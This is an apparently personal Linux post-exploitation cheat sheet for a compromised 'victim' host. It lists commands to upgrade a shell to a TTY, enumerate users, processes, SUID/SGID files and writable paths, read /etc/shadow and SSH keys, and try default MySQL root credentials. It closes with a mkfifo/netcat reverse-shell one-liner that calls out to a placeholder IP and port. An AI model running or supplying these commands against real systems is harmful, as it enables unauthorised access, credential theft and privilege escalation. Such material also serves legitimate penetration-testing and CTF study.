## getting a tty shell:-
python -c ‘import pty; pty.spawn("/bin/bash")’<br />
or<br />
python3 -c ‘import pty; pty.spawn("/bin/bash")’<br />
or<br />
python -c ‘import pty; pty.spawn("/bin/sh")’<br />
or<br />
python3 -c ‘import pty; pty.spawn("/bin/bash")’<br />
or<br />
SHELL="/bin/bash" script -q /dev/null<br />

## getting a colored tty shell (after getting a tty shell):- 
#### *do this in your host machine because u need the length and breadth of the window of ur terminal*

stty -a <br />
#### *then do the following in the victim shell*<br />
export SHELL=/bin/bash<br />
export TERM=xterm256-color<br />
stty rows "rows u found in step1" columns "columns u found in step1"<br />

## Making the shell interactive:-

stty raw -echo

## the obvious stuff:-

history (to check the bash history)<br />
whoami (to check the current user)<br />
id <br />
hostname<br />
cat /etc/passwd<br />
sudo -l (to list all perms of the user)<br />
sudo --version (to check the version and see if it is vulnerable to any exploit)<br />

## about system and processes running:-

uname -a (to get the version of the kernel)<br />
cat /etc/shells 2>/dev/null (list available shells)<br />
ps aux 2>/dev/null<br />
find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null (init.d files not belonging to root)<br />
find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null (systemd files not belonging to root)<br />
mysql --version 2>/dev/null (to check the version of mysql if installed to check for any known vulnerabilities)<br />
mysqladmin -uroot -proot version 2>/dev/null (to check if default creds work)<br />
mysqladmin -uroot version 2>/dev/null (to check if no pass works)<br />
psql -V 2>/dev/null (to check the version of postgresql if installed to check for any known vulnerabilities)<br />

## about users:-

cat /etc/passwd 2>/dev/null<br />
lastlog (to get last login details of all user accounts)<br />
w (to check if any other user is currently logged on)<br />
cat /etc/group (to see if any user is part of other groups)<br />
cat /etc/shadow (if we r in the root or shadow group)<br />
cat /etc/master.passwd (same as /etc/shadow but for bsd)<br />
find /home -name .sudo_as_admin_successful 2>/dev/null (find who has sudoed earlier)<br />

## then find files owned by the user/group/root via the following:-

ls -l<br />
find / -user "username/root" -group "groupname" exec ls -lb 2>/dev/null<br />
locate "groupname"(sometimes can result in filenames having the groupname in it.....MIGHT BE INTERESTING!!)<br />

## then find files not owned by the user/group/root but have rights via the following:-

find / -readable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null (read rights)<br />
find / -writable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null (write rights)<br />
find / -executable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null (executable rights)<br />
find / -user root -perm -4000 2>/dev/null (for getting setuid files)<br />
find / -user root -perm -2000 2>/dev/null (for getting all setgid files)<br />
find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) 2>/dev/null  (to get ssh info)<br />

## To download something from the internet or from intranet:-

Can do a wget or curl

## To get a netcat shell in bsd if -e flag is missing

mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f
